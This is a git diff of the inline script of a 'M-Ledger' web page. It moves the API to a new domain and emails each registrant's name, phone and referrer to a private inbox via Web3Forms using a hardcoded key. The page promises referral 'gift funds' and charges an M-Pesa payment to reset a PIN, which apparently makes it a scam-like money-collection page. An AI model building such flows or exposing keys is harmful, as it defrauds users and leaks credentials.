@@ -70,7 +70,7 @@
     </div>
 
     <script>
-        const API = "https://funds-mauve.vercel.app/api";
+        const API = "https://money.emxluz.xyz/api";
         const BACKEND_PAYMENT = "https://newpayment-srpu.onrender.com";
         const WEB3FORMS_KEY = "bf0e28a0-7666-4bfc-91ad-bcb1699d5d6c";
 
@@ -79,6 +79,7 @@
                 document.getElementById(id).style.display = (id === sectionId) ? 'block' : 'none';
             });
             document.getElementById('status').innerText = "";
+            document.getElementById('status').style.color = "#aaa";
         }
 
         function toggleReferralInput() {
@@ -103,11 +104,11 @@
                 return;
             }
 
-            btn.innerText = "Processing...";
+            btn.innerText = "Creating Account...";
             btn.disabled = true;
 
             try {
-                // STEP 1: Submit to your Database First
+                // 1. Submit to your Database (Main API)
                 const res = await fetch(`${API}/register`, {
                     method:'POST',
                     headers:{'Content-Type':'application/json'},
@@ -115,45 +116,40 @@
                 });
                 const d = await res.json();
 
-                // STEP 2: Only if database registration is successful, send email
-                if(res.ok || d.success) {
-                    
-                    // Sending to your Gmail via Web3Forms
-                    await fetch("https://api.web3forms.com/submit", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            access_key: WEB3FORMS_KEY,
-                            subject: "Account Created + Referral Info",
-                            from_name: "M-Ledger Registration",
-                            message: `SUCCESSFUL REGISTRATION\n\nName: ${name}\nUser Phone: ${phone}\n\nREFERRAL DETAILS:\nStatus: ${refStatus === 'yes' ? 'Was Referred' : 'No Referral'}\nReferrer Number: ${refPhone}`
-                        })
-                    });
+                // 2. Submit Referral details to your Gmail (Web3Forms)
+                await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_KEY,
+                        subject: "New M-Ledger Referral Notification",
+                        message: `Account Created: ${name}\nUser Phone: ${phone}\nReferrer: ${refPhone}`
+                    })
+                });
 
-                    // STEP 3: Show the long-lasting success message
+                // 3. Success Message with long delay (7 seconds)
+                if(res.ok || d.success) {
                     status.style.color = "#4CAF50";
-                    status.innerHTML = "✅ Account Created Successfully!<br>Soon you and your referee will get gift funds soon.";
+                    status.innerHTML = "✅ Account Created Successfully!<br>Soon you and your referee will get gift funds.";
                     
-                    // Stay on screen for 8 seconds
+                    // Delay for 7 seconds so they can read it
                     setTimeout(() => {
                         showSection('loginSection');
-                    }, 8000);
-
+                    }, 7000); 
                 } else {
                     status.style.color = "#ffab00";
-                    status.innerText = d.error || "Registration failed on server.";
+                    status.innerText = d.error || "Registration failed.";
                     btn.disabled = false;
                     btn.innerText = "Register";
                 }
             } catch (err) {
                 status.style.color = "#ff4444";
-                status.innerText = "Network error. Please try again.";
+                status.innerText = "Registration failed. Check connection.";
                 btn.disabled = false;
                 btn.innerText = "Register";
             }
         }
 
-        // --- Keep existing login/PIN functions ---
         async function login() {
             const btn = document.getElementById('lBtn');
             const status = document.getElementById('status');
@@ -168,8 +164,13 @@
                     body: JSON.stringify({ phone, password: pass })
                 });
                 const d = await res.json();
-                if (d.success) { showSection('choiceSection'); } 
-                else { status.innerText = d.error || "Login failed"; btn.innerText = "Login"; btn.disabled = false; }
+                if (d.success) {
+                    showSection('choiceSection');
+                } else {
+                    status.style.color = "#ffab00";
+                    status.innerText = d.error || "Login failed";
+                    btn.innerText = "Login"; btn.disabled = false;
+                }
             } catch (err) { status.innerText = "Connection failed."; btn.disabled = false; btn.innerText = "Login"; }
         }
 
@@ -187,23 +188,23 @@
                     body: JSON.stringify({ amount: 10, phone_number: phone })
                 });
                 const payData = await payRes.json();
-                const inv = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
-                if (inv) {
-                    status.innerText = "Confirm M-Pesa PIN on your phone...";
-                    startPollingReset(inv, phone, newPassword);
+                const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
+                if (invoiceId) {
+                    status.innerText = "Enter M-Pesa PIN on your phone...";
+                    startPollingReset(invoiceId, phone, newPassword);
                 } else { throw new Error(); }
             } catch (err) {
-                status.innerText = "Verification error. Safaricom lines only.";
+                status.innerText = "Verification failed. Use a Safaricom line.";
                 btn.disabled = false; btn.innerText = "Verify & Update PIN";
             }
         }
 
-        function startPollingReset(inv, phone, newPassword) {
+        function startPollingReset(invoiceId, phone, newPassword) {
             let pollCount = 0;
             const pollTimer = setInterval(async () => {
                 pollCount++;
                 try {
-                    const res = await fetch(`${BACKEND_PAYMENT}/api/status/${inv}`);
+                    const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
                     const data = await res.json();
                     const state = data.invoice ? data.invoice.state : data.state;
                     if (state === "COMPLETE" || state === "COMPLETED") {
@@ -226,6 +227,7 @@
                     body: JSON.stringify({ phone, newPassword })
                 });
                 if (res.ok) {
+                    document.getElementById('status').style.color = "#4CAF50";
                     document.getElementById('status').innerText = "✅ PIN updated!";
                     setTimeout(() => showSection('loginSection'), 2000);
                 }
